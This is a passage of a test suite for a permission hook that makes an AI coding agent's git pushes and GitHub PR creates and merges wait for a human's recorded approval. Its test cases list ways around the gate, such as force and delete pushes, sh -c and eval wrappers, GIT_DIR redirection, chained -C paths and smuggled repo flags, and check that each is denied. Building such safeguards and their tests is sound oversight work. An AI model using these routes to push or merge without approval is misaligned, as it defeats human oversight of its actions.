    });
  }
  it('corrupt: the push deny is hard (enforceAppPush false does not soften it); popd before a push denies too', async () => {
    expect((await denyOf(bash(PUSH), { registry: '{bad', config: JSON.stringify({ decisions: { enforce: true, enforceAppPush: false } }) }))?.pattern).toBe('registry-corrupt');
    expect((await denyOf(bash(`popd && ${PUSH}`), { registry: '{bad' }))?.pattern).toBe('registry-corrupt');
  });
  // The chosen scope, made visible: a create or merge deny is scope other with the home flags, as every app create or merge deny, so it
  // only warns while decisions.enforce is not literal true. Change that breaks it: give it the push scope, or a scope with no flag.
  it('corrupt: with decisions.enforce not true, a create warns (scope other); the push still denies', async () => {
    const off = { registry: '{bad', config: JSON.stringify({ decisions: {} }) };
    expect(await verdict(bash(CREATE), off)).toMatchObject({ action: 'allow', scope: 'other' });
    expect((await verdict(bash(CREATE), off) as { warn?: string }).warn).toMatch(/^registry-corrupt: /);
    expect((await denyOf(bash(PUSH), off))?.pattern).toBe('registry-corrupt');
  });
  it('corrupt: a CCv3 folder and a non-gated command keep their old output', async () => {
    expect(await handleParsed(JSON.stringify(bash('git status')), deps({ registry: '{bad' }))).toBe('{}');
    expect(await handleParsed(JSON.stringify(bash('git push fork main', '/work/cc')), deps({ registry: '{bad' }))).toBe('{}');
  });
});

describe('C7 the app-push scope denies by default; only a literal false turns it to warn (D2 a, G1)', () => {
  const cfg = (decisions: unknown): World => ({ config: JSON.stringify({ decisions }) });
  it('denies with enforcePush absent, false or true (the push flag is not the app flag)', async () => {
    for (const decisions of [{}, { enforcePush: false }, { enforcePush: true }]) expect((await denyOf(bash(PUSH), cfg(decisions)))?.scope, JSON.stringify(decisions)).toBe('app-push');
  });
  it('denies with no config file, bad JSON, or a value that is not the literal false', async () => {
    expect((await denyOf(bash(PUSH), { config: null }))?.pattern).toBe('ship');
    expect((await denyOf(bash(PUSH), { config: '{bad' }))?.pattern).toBe('ship');
    for (const v of ['false', 0, null, 'no']) expect((await denyOf(bash(PUSH), cfg({ enforceAppPush: v })))?.pattern, String(v)).toBe('ship');
  });
  it('warns with enforceAppPush: false, and the warning names no flag and no off switch', async () => {
    const d = await verdict(bash(PUSH), cfg({ enforceAppPush: false }));
    expect(d).toMatchObject({ action: 'allow', scope: 'app-push' });
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps(cfg({ enforceAppPush: false }))));
    const ctx: string = out.hookSpecificOutput.additionalContext;
    expect(ctx).toContain('WARNING (decision-gate');
    expect(ctx).not.toMatch(/enforceAppPush|enforcePush|tapGate|is true/);
  });
  it('a covered create and merge follow decisions.enforce (scope other)', async () => {
    expect(await verdict(bash(CREATE), cfg({ enforce: false }))).toMatchObject({ action: 'allow', scope: 'other' });
    expect(await verdict(bash(MERGE), cfg({ enforce: false }))).toMatchObject({ action: 'allow', scope: 'other' });
    expect((await denyOf(bash(CREATE), cfg({ enforce: true, enforceAppPush: false })))?.pattern).toBe('open-pr');
  });
  it('a command with a covered push and a covered create: each scope by its own flag', async () => {
    const both = `${CREATE} && ${PUSH}`;
    expect((await denyOf(bash(both), cfg({ enforce: false })))?.scope).toBe('app-push');
    expect((await denyOf(bash(both), cfg({ enforce: true, enforceAppPush: false })))?.scope).toBe('other');
  });
});

describe('CLI run 2 of C2b: the no-parse deny in a covered folder reads decisions.enforce from the home copy', () => {
  // Change that breaks it: parserUnavailableDenies returns the deny without homeFlags, so the checkout copy (enforce false) turns a late-parse create or merge into a warning.
  const lateDeny = (cmd: string, w: World): string => { const d = decide(bash(cmd), deps(w)); return d.action === 'deny' ? d.pattern : 'allow'; };
  const split = { config: JSON.stringify({ decisions: { enforce: false } }), homeConfig: JSON.stringify({ decisions: { enforce: true } }) };
  it('home enforce true, checkout enforce false: a covered create and merge with no parse are denied parser-unavailable', () => {
    expect(lateDeny(CREATE, split)).toBe('parser-unavailable');
    expect(lateDeny(MERGE, split)).toBe('parser-unavailable');
  });
  it('a null parse (a failed or thrown parse) reads the home flag the same way as an absent one', () => {
    const d = decide(bash(CREATE), { ...deps(split), parsed: null } as unknown as Deps);
    expect(d.action === 'deny' ? d.pattern : 'allow').toBe('parser-unavailable');
  });
  it('(paired) home enforce false: the same texts only warn', () => {
    const off = { config: split.config, homeConfig: split.config };
    expect(lateDeny(CREATE, off)).toBe('allow');
    expect(lateDeny(MERGE, off)).toBe('allow');
  });
  it('(paired) a CCv3 checkout keeps the checkout lookup: enforce false in its copy only warns', () => {
    const d = decide(bash(CREATE, '/work/cc'), deps({ ...split }));
    expect(d.action === 'deny' ? d.pattern : 'allow').toBe('allow');
  });
});

describe('C8 remotes and branches in a covered folder (R5b, R6)', () => {
  it('every remote is gated and none is banned: origin is a plain remote here', async () => {
    const f = { ...FOLDERS, '/work/app-x': { remotes: { origin: 'https://github.com/acme/app-x.git' } } };
    expect((await denyOf(bash('git push origin feat'), { folders: f }))?.pattern).toBe('ship');
    shipX();
    expect(await passes(bash('git push origin feat'), { folders: f })).toBe(true);
  });
  it('two remotes: the key is the repo of the remote the push names', async () => {
    tap('ship', 'acme/two@feat', HEAD, 'Commit and push', TREE);
    expect(await passes(bash('git push up feat', '/work/two'))).toBe(true);
    expect((await denyOf(bash('git push mirror feat', '/work/two')))?.pattern).toBe('ship');
    tap('ship', 'acme/two-mirror@feat', HEAD, 'Commit and push', TREE);
    expect(await passes(bash('git push mirror feat', '/work/two'))).toBe(true);
  });
  it('a remote with its own push URL keys by the push URL (where the push goes)', async () => {
    const f = { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), pushUrls: { up: 'git@github.com:acme/app-x-push.git' } } };
    shipX();
    expect((await denyOf(bash(PUSH), { folders: f }))?.pattern).toBe('ship');
    tap('ship', 'acme/app-x-push@feat', HEAD, 'Commit and push', TREE);
    expect(await passes(bash(PUSH), { folders: f })).toBe(true);
  });
  // Fixer E: main, not feat. A URL target has no remote HEAD, so feat is no default branch there and passes with no tap (C22).
  it('a URL as the remote keys by that URL', async () => {
    tap('ship', 'acme/app-x@main', HEAD, 'Commit and push', TREE);
    expect(await passes(bash('git push https://github.com/acme/app-x.git main'))).toBe(true);
    expect((await denyOf(bash('git push https://github.com/acme/app-y.git main')))?.pattern).toBe('ship');
  });
  it('no remote named: the key comes from @{push}; with no @{push} the push is denied "name the remote", tap or not', async () => {
    shipX();
    const r = await denyOf(bash('git push'));
    expect(r).toMatchObject({ pattern: 'push-remote-unresolved', scope: 'app-push' });
    expect(r!.reason).toContain('name the remote');
    const f = { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), pushRef: 'up/feat' } };
    expect(await passes(bash('git push'), { folders: f })).toBe(true);
  });
  it('a push of main needs a tap', async () => {
    expect((await denyOf(bash('git push up main')))?.pattern).toBe('ship');
    shipX('Commit and push', 'main');
    expect(await passes(bash('git push up main'))).toBe(true);
  });
  it('force, delete, mirror, all, tags and a subagent push are app-push denies, even with a tap', async () => {
    shipX(); shipX('Commit and push', 'main');
    for (const cmd of ['git push --force up feat', 'git push up +feat', 'git push -d up feat', 'git push --mirror up', 'git push --all up', 'git push --tags up', 'git push up :feat', 'git push -f up main']) {
      expect(await denyOf(bash(cmd)), cmd).toMatchObject({ pattern: 'push-unsafe', scope: 'app-push' });
    }
    expect(await denyOf(bash(PUSH, '/work/app-x', { agent_id: 'sub1' }))).toMatchObject({ pattern: 'subagent', scope: 'app-push' });
  });
  it('a detached HEAD (no branch) is denied', async () => {
    const f = { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), branch: '' } };
    expect(await denyOf(bash('git push up'), { folders: f })).toMatchObject({ pattern: 'push-target-unresolved', scope: 'app-push' });
  });
  it('GIT_DIR, --git-dir and an unexpanded cd in a covered folder are app-push denies', async () => {
    expect(await denyOf(bash(`GIT_DIR=/x/.git ${PUSH}`))).toMatchObject({ pattern: 'push-target-unresolved', scope: 'app-push' });
    expect(await denyOf(bash('git --git-dir=/x/.git push up feat'))).toMatchObject({ pattern: 'push-target-unresolved', scope: 'app-push' });
    expect(await denyOf(bash(`cd $D && ${PUSH}`))).toMatchObject({ pattern: 'cd-unexpanded', scope: 'app-push' });
  });
});

describe('C4 position unknown before each shape (R3a)', () => {
  const forms = ['popd', 'cd -', 'cd'];
  const shapes: [string, () => void][] = [[PUSH, () => shipX()], [CREATE, () => openX()], [MERGE, () => mergeX()]];
  for (const form of forms) {
    for (const [cmd, grant] of shapes) {
      it(`${form} before "${cmd.split(' ').slice(0, 3).join(' ')}" from a covered cwd is denied, tap or not`, async () => {
        grant();
        expect((await denyOf(bash(`${form} && ${cmd}`)))?.pattern).toBe('position-unknown');
      });
      it(`${form} before "${cmd.split(' ').slice(0, 3).join(' ')}" with a covered folder on the path is denied`, async () => {
        expect((await denyOf(bash(`cd /work/app-x && ${form} && ${cmd}`, '/work/stray')))?.pattern).toBe('position-unknown');
      });
    }
    it(`${form} before a push with no covered folder anywhere passes`, async () => {
      expect(await passes(bash(`${form} && ${PUSH}`, '/work/stray'))).toBe(true);
    });
  }
  it('the push position deny has scope app-push; the create one has scope other', async () => {
    expect((await denyOf(bash(`popd && ${PUSH}`)))?.scope).toBe('app-push');
    expect((await denyOf(bash(`popd && ${CREATE}`)))?.scope).toBe('other');
  });
});

describe('C9 a create or merge that names a repo (R5c)', () => {
  it('in a covered folder: a named repo that differs from the key repo is denied, tap or not', async () => {
    mergeX(); mergeX('other/lib');
    const r = await denyOf(bash(`${MERGE} -R other/lib`));
    expect(r?.pattern).toBe('repo-differs');
    expect((await denyOf(bash(`gh api -X PUT repos/other/lib/pulls/7/merge -f sha=${HEAD}`)))?.pattern).toBe('repo-differs');
    expect((await denyOf(bash(`gh pr merge https://github.com/other/lib/pull/7 --match-head-commit ${HEAD}`)))?.pattern).toBe('repo-differs');
  });
  it('in a covered folder: the same repo named passes with its tap; two different repos named are denied', async () => {
    mergeX(); openX();
    expect(await passes(bash(`${MERGE} -R Acme/App-X`))).toBe(true);
    expect(await passes(bash(`${CREATE} --repo acme/app-x`))).toBe(true);
    // F1: two repos in the gh segment itself fail closed; a chained second gh call names no repo for the first.
    expect((await denyOf(bash(`${MERGE} -R acme/app-x -R other/lib`)))?.pattern).toBe('repo-differs');
    expect(await passes(bash(`${MERGE} -R acme/app-x && gh pr view 7 -R other/lib`))).toBe(true);
  });
  it('in a covered folder: a repo the hook cannot read (-R $R) is denied', async () => {
    mergeX();
    expect((await denyOf(bash(`${MERGE} -R $R`)))?.pattern).toBe('repo-unreadable');
  });
  it('in a covered folder with two remotes: a create or merge that names no repo is denied; naming the repo of one remote keys on it (F4)', async () => {
    tap('land', 'acme/two#7', HEAD, 'Merge now (no READY check)');
    expect((await denyOf(bash(MERGE, '/work/two')))?.pattern).toBe('repo-unnamed');
    const f = { ...FOLDERS, '/work/two': { ...FOLDERS['/work/two'], pushRef: 'up/feat' } };
    expect((await denyOf(bash(MERGE, '/work/two'), { folders: f }))?.pattern).toBe('repo-unnamed');
    expect(await passes(bash(`${MERGE} -R acme/two`, '/work/two'), { folders: f })).toBe(true);
    expect(await passes(bash(`${MERGE} -R acme/two`, '/work/two'))).toBe(true);
    // The tap for acme/two does not license the other remote's repo: that is its own key.
    expect((await denyOf(bash(`${MERGE} -R acme/two-mirror`, '/work/two'), { folders: f }))?.pattern).toBe('land');
    expect((await denyOf(bash(`${MERGE} -R other/lib`, '/work/two'), { folders: f }))?.pattern).toBe('repo-differs');
  });
  it('from a CCv3 folder: a create or merge that names another repo is denied "go to that repo folder", even with a CCv3 tap', async () => {
    tap('land', 'Rev4nchist/Continuous-Claude-v3#7', HEAD, 'Land now');
    tap('open-pr', 'Rev4nchist/Continuous-Claude-v3@feat', HEAD, 'Open draft PR');
    const ccv3: Folder = { remotes: { fork: CCV3_URL } };
    const w: World = { folders: { ...FOLDERS, '/work/cc': ccv3 } };
    expect(await passes(bash(MERGE, '/work/cc'), w)).toBe(true);
    for (const cmd of [`${MERGE} -R acme/app-x`, `${CREATE} --repo acme/app-x`, `gh api -X PUT repos/acme/app-x/pulls/7/merge -f sha=${HEAD}`]) {
      const r = await denyOf(bash(cmd, '/work/cc'), w);
      expect(r?.pattern, cmd).toBe('repo-foreign');
      expect(r?.reason, cmd).toContain('go to that repo folder');
      expect(r?.reason, cmd).toContain('acme/app-x');
    }
  });
});

describe('C10 labels and heads of a covered merge (G3)', () => {
  it('the CCv3 gate refuses a land row labelled "Merge now (no READY check)"', async () => {
    tap('land', 'Rev4nchist/Continuous-Claude-v3#7', HEAD, 'Merge now (no READY check)');
    expect((await denyOf(bash(MERGE, '/work/cc')))?.pattern).toBe('land');
  });
  it('a covered merge refuses "Land now" and "Land when READY"', async () => {
    mergeX('acme/app-x', 'Land now'); mergeX('acme/app-x', 'Land when READY');
    expect((await denyOf(bash(MERGE)))?.pattern).toBe('land');
  });
  it('a covered merge needs sha= or --match-head-commit equal to the tapped head', async () => {
    mergeX();
    expect((await denyOf(bash('gh pr merge 7 --squash')))?.pattern).toBe('merge-no-head');
    expect((await denyOf(bash(`gh pr merge 7 --match-head-commit ${HEAD2}`)))?.pattern).toBe('land');
    expect((await denyOf(bash('gh pr merge --squash')))?.pattern).toBe('no-pr');
  });
  it('a covered create refuses another label and another head', async () => {
    tap('open-pr', 'acme/app-x@feat', HEAD, 'Stop here');
    tap('open-pr', 'acme/app-x@feat', HEAD2, 'Open draft PR');
    expect((await denyOf(bash(CREATE)))?.pattern).toBe('open-pr');
  });
});

describe('C12 a git throw after coverage is known is unjudgeable with scope app-push', () => {
  const throwing = (args: string[]): World => ({ folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), throwOn: args } } });
  it('denies by default (enforcePush absent), and warns when enforceAppPush is false', async () => {
    const w = throwing(['rev-parse feat^{tree}']);
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps(w)));
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toContain("could not verify Dave's tap");
    const warn = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps({ ...w, config: JSON.stringify({ decisions: { enforceAppPush: false } }) })));
    expect(warn.hookSpecificOutput.permissionDecision).toBeUndefined();
    expect(warn.hookSpecificOutput.additionalContext).not.toMatch(/enforceAppPush|enforcePush|is true/);
  });
  it('fail closed: the catch keeps the push scope too, so enforcePush true denies even with enforceAppPush false', async () => {
    const w = { ...throwing(['rev-parse feat^{tree}']), config: JSON.stringify({ decisions: { enforcePush: true, enforceAppPush: false } }) };
    expect(JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps(w))).hookSpecificOutput.permissionDecision).toBe('deny');
  });
  // Item 4 (principal minor "git throw before coverage is known") -> drop the path test in unjudgeable and this row warns again.
  it('a throw before coverage is known (git remote -v) in a folder under a live root gets scope app-push: denied by default', async () => {
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps(throwing(['remote -v']))));
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toContain("could not verify Dave's tap");
    const sub = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH, '/work/app-x/src')), deps({ folders: { ...FOLDERS, '/work/app-x/src': { remotes: gh('acme/app-x'), top: '/work/app-x', throwOn: ['remote -v'] } } })));
    expect(sub.hookSpecificOutput.permissionDecision, 'a subfolder of the root').toBe('deny');
  });
  // Change that breaks it: coveredAmong swallows the throw with no path test (the deny falls back to scope push and only warns).
  it('a GIT_DIR or unexpanded-cd push whose folder git cannot read (timeout) keeps scope app-push by the path test', async () => {
    for (const cmd of [`GIT_DIR=/x/.git ${PUSH}`, `cd $D && ${PUSH}`]) expect((await denyOf(bash(cmd), throwing(['remote -v'])))?.scope, cmd).toBe('app-push');
    // Fix round 5 re-pin (F3, ruling B): this row pinned the allow of a GIT_DIR push from an unregistered cwd. GIT_DIR aimed at the app
    // repo /work/app-x is now judged by the rule of that repo: denied, scope app-push. A GIT_DIR that names no repo git can read and no
    // folder under a live root (/x/.git) keeps the base path: scope push (warn).
    const strayThrows: World = { folders: { ...FOLDERS, '/work/stray': { ...FOLDERS['/work/stray'], throwOn: ['remote -v'] } } };
    expect((await denyOf(bash(`GIT_DIR=/work/app-x/.git ${PUSH}`, '/work/stray'), strayThrows))?.scope).toBe('app-push');
    // Round 3 C3 (item 10): only a RESOLVED unregistered move target keeps the warning. /x/.git became the drive-relative x: on Windows (not
    // absolute, so hard) and /x on Linux; /work/none/.git is the same absolute folder under no root on both.
    expect(await verdict(bash(`GIT_DIR=/work/none/.git ${PUSH}`, '/work/stray'), strayThrows)).toMatchObject({ action: 'allow', scope: 'push' });
  });
  it('a throw in the rev-parse of coverage (after the path test) is scope app-push too', async () => {
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps(throwing(['rev-parse --path-format=absolute --show-toplevel --git-common-dir']))));
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
  });
  it('the path test leaves the rest as before: an unregistered folder keeps scope push (warn); a live entry inside the continuous-claude root keeps scope push (round 3 item 18: a hard deny)', async () => {
    // Seat 2026-11-14 20:00 (Dave's D1): a resolved folder outside every registry root keeps the old result.
    const stray: World = { folders: { ...FOLDERS, '/work/stray': { ...FOLDERS['/work/stray'], throwOn: ['remote -v'] } } };
    const s = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH, '/work/stray')), deps(stray)));
    expect(s.hookSpecificOutput.permissionDecision).toBeUndefined();
    expect(s.hookSpecificOutput.additionalContext).toContain('decisions.enforcePush');
    // Round 3 item 18 (Dave: "Land now, fix first in round 3"): under the CCv3 root a push whose judging throws denies whatever
    // decisions.enforcePush says. The scope stays push: the text is the base text, with no app-folder words.
    const dir = '/work/ccroot/apps/agentic';
    const w: World = { folders: { ...FOLDERS, [dir]: { ...FOLDERS[dir], throwOn: ['remote -v'] } } };
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH, dir)), deps(w)));
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toContain('push check could not run');
    expect(out.hookSpecificOutput.permissionDecisionReason).not.toMatch(/app folder/i);
  });

  it('round 3 item 18 (seat 20:00): an unregistered push whose git throws, chained with an origin push, still denies (the hole stays closed)', async () => {
    // Breaks when: the unregistered-folder exemption also drops the intent check of the other push of the command.
    const stray: World = { folders: { ...FOLDERS, '/work/stray': { ...FOLDERS['/work/stray'], throwOn: ['remote -v'] } } };
    const o = JSON.parse(await handleParsed(JSON.stringify(bash(`${PUSH} && git push origin main`, '/work/stray')), deps(stray)));
    expect(o.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(o.hookSpecificOutput.permissionDecisionReason).toMatch(/origin/i);
  });
});

describe('C11 every covered deny text names the judged folder, the full offer command, and nothing of CCv3 (R9, S6)', () => {
  const BANNED: [string, RegExp][] = [
    ['land script', /land-pr/i], ['ship-ask', /ship-ask/i], ['fork', /\bfork\b/i], ['origin is', /origin is/i], ['parcadei', /parcadei/i],
    ['relative script path', /(?<!continuous-claude\/)scripts\/github\//], ['tapGate', /tapGate/i], ['off switch', /\boff\b|disable|enforceAppPush/i],
    // Fixer G (principal major F2 advice): no text tells the model to quote a value itself.
    ['quoting advice', /single quotes|fill in/i],
  ];
  const f2 = { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), branch: '', throwOn: [] } };
  const cases: [string, object, World?, string?][] = [
    ['ship', bash(PUSH), undefined, `${ASK} push --remote up --branch feat --src feat --dir '/work/app-x' --json`],
    // Seat review 1, item 4: the registry-corrupt deny text holds nothing banned either.
    ['registry-corrupt push', bash(PUSH), { registry: '{bad' }],
    ['registry-corrupt merge', bash(MERGE), { registry: '{bad' }],
    ['ship no remote named', bash('git push'), { folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), pushRef: 'up/feat' } } }, `${ASK} push --remote up --branch feat --src HEAD --dir '/work/app-x' --json`],
    ['push-urls', bash(PUSH), { folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), pushUrls: { up: ['https://github.com/acme/app-x.git', 'https://github.com/acme/b.git'] } } } }],
    ['fetch-push-differ', bash(CREATE), { folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), pushUrls: { up: 'https://github.com/me/app-x.git' } } } }, `${ASK} open-pr --remote up --branch feat --dir '/work/app-x' --json`],
    ['open-pr', bash(CREATE), undefined, `${ASK} open-pr --remote up --branch feat --dir '/work/app-x' --json`],
    ['land', bash(MERGE), undefined, `${ASK} merge --pr 7 --remote up --dir '/work/app-x' --json`],
    ['merge-no-head', bash('gh pr merge 7'), undefined, `${ASK} merge --pr 7 --remote up --dir '/work/app-x' --json`],
    ['no-pr', bash('gh pr merge --squash')],
    ['push-remote-unresolved', bash('git push')],
    ['push-target-unresolved (detached)', bash('git push up'), { folders: f2 }],
    ['push-target-unresolved (moved)', bash('git --git-dir=/x/.git push up feat')],
    ['push-target-unresolved (GIT_DIR)', bash(`GIT_DIR=/x/.git ${PUSH}`)],
    ['push-target-unresolved (not a ref)', bash('git push up -- -x:feat')],
    ['push-tree-unresolved', bash('git push up nope:feat')],
    ['push-unsafe', bash('git push --force up feat')],
    // Fix round 5 (F9): one deny row per finding of the seat reviewer.
    ['R5 F1 push-unsafe (option value hides -f)', bash('git push -uo -n -f up main')],
    ['R5 F1 push-target-unresolved (option value hides -h)', bash('git push -uo -h up main')],
    ['R5 F2 push-unsafe (sh -c)', bash(`sh -c 'git push -f up topic'`)],
    ['R6 ship (a force word of another command beside a push: the tap path)', bash('test -f x && git push up topic')],
    ['R5 F8 base-unresolved (two bases)', bash('gh pr create --draft --head feat --base dev --title t --base main')],
    ['R5 F2 push-target-unresolved (eval)', bash(`eval 'git push up topic'`)],
    ['R5 F3 push-target-unresolved (GIT_DIR at the app repo, unregistered cwd)', bash('GIT_DIR=/work/app-x/.git git push up topic', '/work/stray')],
    ['R5 F3 push-target-unresolved (--git-dir at the app repo, CCv3 cwd)', bash('git --git-dir=/work/app-x/.git push up topic', '/work/cc')],
    // Fix round 6 (item 4): the chain names /work/app-x only through BOTH -C values, from a CCv3 cwd. The base reading (last -C wins)
    // runs in the uncovered <cwd>/app-x (platform path rules), so dropping the chain reading turns this row red.
    ['R5 F4 ship (-C chain into the app repo)', bash('git -C /work -C app-x push up main', '/work/cc'), { folders: { ...FOLDERS, [slash(resolve('/work/cc', 'app-x'))]: { remotes: gh('acme/stray') } } }, `${ASK} push --remote up --branch main --src main --dir '/work/app-x' --json`],
    ['R5 F5 ship (an app config file does not warn)', bash('git push up main'), { appConfig: JSON.stringify({ decisions: { enforceAppPush: false } }) }],
    ['R5 F6 ship (Main)', bash('git push up Main'), { folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), trees: { Main: TREE } } } }],
    ['R5 F8 open-pr (with a base)', bash('gh pr create --draft --head feat --base dev --title t'), undefined, `${ASK} open-pr --remote up --branch feat --base dev --dir '/work/app-x' --json`],
    ['subagent push', bash(PUSH, '/work/app-x', { agent_id: 's' })],
    ['cd-unexpanded push', bash(`cd $D && ${PUSH}`)],
    ['cd-unexpanded create', bash(`cd $D && ${CREATE}`)],
    ['repo-moved create', bash(`GIT_DIR=/x/.git ${CREATE}`)],
    ['position-unknown push', bash(`popd && ${PUSH}`)],
    ['position-unknown merge', bash(`popd && ${MERGE}`)],
    ['head-unresolved (no branch)', bash('gh pr create --draft --title t'), { folders: f2 }],
    ['head-unresolved (no head)', bash('gh pr create --draft --head nobranch --title t')],
    ['repo-differs', bash(`${MERGE} -R other/lib`)],
    ['repo-unreadable', bash(`${MERGE} -R $R`)],
    ['repo-unnamed', bash(MERGE, '/work/two')],
  ];
  for (const [name, input, w, offer] of cases) {
    it(`${name}`, async () => {
      const out = JSON.parse(await handleParsed(JSON.stringify(input), deps(w)));
      const text: string = out.hookSpecificOutput?.permissionDecisionReason ?? '';
      expect(text, name).toMatch(/^BLOCKED \(decision-gate\): /);
      const dir = (input as { cwd: string }).cwd === '/work/two' ? '/work/two' : '/work/app-x';
      expect(text, name).toContain(dir);
      for (const [what, re] of BANNED) expect(re.test(text), `${name}: ${what} in: ${text}`).toBe(false);
      if (offer) expect(text, name).toContain(offer);
      for (const m of text.matchAll(/node '?\S*app-ask\.mjs'?/g)) expect(m[0], name).toBe(ASK);
    });
  }
  it('the warn line, the unjudgeable text and the S5 line hold nothing banned either', async () => {
    const texts = [
      JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps({ config: JSON.stringify({ decisions: { enforceAppPush: false } }) }))).hookSpecificOutput.additionalContext,
      JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps({ folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), throwOn: ['rev-parse feat^{tree}'] } } }))).hookSpecificOutput.permissionDecisionReason,
      JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps({ registry: '{bad' }))).hookSpecificOutput.additionalContext,
    ];
    for (const text of texts) for (const [what, re] of BANNED) expect(re.test(text), `${what} in: ${text}`).toBe(false);
  });
});

describe('C14 F1: a repo is read only where gh takes one, in the gh segment itself (R5c, seat S3)', () => {
  const ccv3: World = { folders: { ...FOLDERS, '/work/cc': { remotes: { fork: CCV3_URL } } } };
  const BODY_URL = '--body "Works around https://github.com/anthropics/claude-code/issues/1234"';
  const tapCcv3 = (): void => {
    tap('open-pr', 'Rev4nchist/Continuous-Claude-v3@feat', HEAD, 'Open draft PR');
    tap('land', 'Rev4nchist/Continuous-Claude-v3#7', HEAD, 'Land now');
  };
  // Change that breaks it: cmdRepoOf reads the whole raw text again (quotes and other segments).
  it('a CCv3 create with an issue URL in --body and its tap is allowed, as before the card', async () => {
    tapCcv3();
    expect(await verdict(bash(`gh pr create --draft --head feat --title t ${BODY_URL}`, '/work/cc'), ccv3)).toEqual({ action: 'allow' });
  });
  it('a covered create with the same body and its tap is allowed', async () => {
    openX();
    expect(await passes(bash(`${CREATE} ${BODY_URL}`))).toBe(true);
  });
  // Round 3 C1 (seat GO 07:3x, the first C1 cost): a body made by $(...) is refused even with the tap. A " inside $(...) does not close
  // the outer quote in bash, so a head flag can hide in it; the deny names the way out (--body-file, -F body=@).
  it('a CCv3 create whose heredoc body names another repo is head-unresolved even with its tap (round 3 C1 cost)', async () => {
    tapCcv3();
    const cmd = `gh pr create --draft --head feat --title t --body "$(cat <<'EOT'\nsee https://github.com/other/lib/pull/3\nEOT\n)"`;
    const r = await denyOf(bash(cmd, '/work/cc'), ccv3);
    expect(r?.pattern).toBe('head-unresolved');
    expect(r!.reason).toMatch(/--body-file <path>/);
  });
  it('a CCv3 merge chained to a gh call that names another repo is judged with the CCv3 key', async () => {
    tapCcv3();
    expect(await passes(bash(`${MERGE} && gh pr view 3 -R other/lib`, '/work/cc'), ccv3)).toBe(true);
  });
  // Change that breaks it: read the masked view only (the quoted -R value, api path or URL is lost), so the folder key allows another repo.
  it('a covered merge: a quoted -R value, a quoted api path and a quoted PR URL still name their repo', async () => {
    mergeX();
    expect((await denyOf(bash(`${MERGE} -R "other/lib"`)))?.pattern).toBe('repo-differs');
    expect((await denyOf(bash(`gh api -X PUT "repos/other/lib/pulls/7/merge" -f sha=${HEAD}`)))?.pattern).toBe('repo-differs');
    expect((await denyOf(bash(`gh pr merge "https://github.com/other/lib/pull/7" --match-head-commit ${HEAD}`)))?.pattern).toBe('repo-differs');
  });
  // Change that breaks it: cut the merge text at the raw break (a quoted ;) instead of the next break outside quotes.
  it('a covered merge: a -R after a quoted ; in --body is still in the gh segment', async () => {
    mergeX();
    expect((await denyOf(bash(`gh pr merge 7 --body "a; b" -R other/lib --match-head-commit ${HEAD}`)))?.pattern).toBe('repo-differs');
  });
  // Change that breaks it: ownCommand cuts at the & of a redirect, so a -R after 2>&1 is lost and the folder key allows another repo.
  it('a covered merge: a -R after a 2>&1 redirect is still in the gh segment', async () => {
    mergeX();
    expect((await denyOf(bash(`${MERGE} 2>&1 -R other/lib`)))?.pattern).toBe('repo-differs');
  });
  // Change that breaks it: the merge shape id without its own text, so the second merge of the same PR and head is dropped.
  it('a covered command with two merges of PR 7 at one head: the second, for another repo, is judged too', async () => {
    mergeX();
    expect((await denyOf(bash(`${MERGE} -R acme/app-x; ${MERGE} -R other/lib`)))?.pattern).toBe('repo-differs');
  });
  // PR C2a: the same row with the real parse, as the hook runs. Main allowed the second merge here (the parser's repo read took the first -R for both shapes: a hole on main).
  // Change that breaks it: withAstMerges takes the first parsed merge that names another repo for every shape of the PR, so the second merge is judged by the first one's words.
  it('C2a pin: with the real parse, the second merge of PR 7 for another repo is judged too (closed hole of main)', async () => {
    mergeX();
    const input = bash(`${MERGE} -R acme/app-x; ${MERGE} -R other/lib`);
    const d = decide(input, await withParsed(JSON.stringify(input), deps()));
    expect(d.action === 'deny' ? d.pattern : 'allow').toBe('repo-differs');
  });
  it('a variable -R of another segment does not make a covered create unreadable; its own -R $R does', async () => {
    openX();
    expect(await passes(bash(`ls -R $D && ${CREATE}`))).toBe(true);
    // Round 3 C1: a $ outside quotes is refused by the create reader first (head-unresolved; still a deny, other text).
    expect((await denyOf(bash(`${CREATE} -R $R`)))?.pattern).toBe('head-unresolved');
  });
});

describe('C15 a CCv3 slug outside the gh segment does not take a covered folder off the app rule (R9)', () => {
  const PORT = '--body "port of https://github.com/Rev4nchist/Continuous-Claude-v3/pull/5"';
  // Change that breaks it: judgeCreate and judgeLand take the CCv3 path whenever namedRepo (whole raw text) names CCv3.
  it('a covered create from main with a CCv3 PR URL in --body goes to the app path: denied with no tap, allowed with its tap', async () => {
    const cmd = `gh pr create --draft --head main --base dev --title t ${PORT}`;
    const r = await denyOf(bash(cmd));
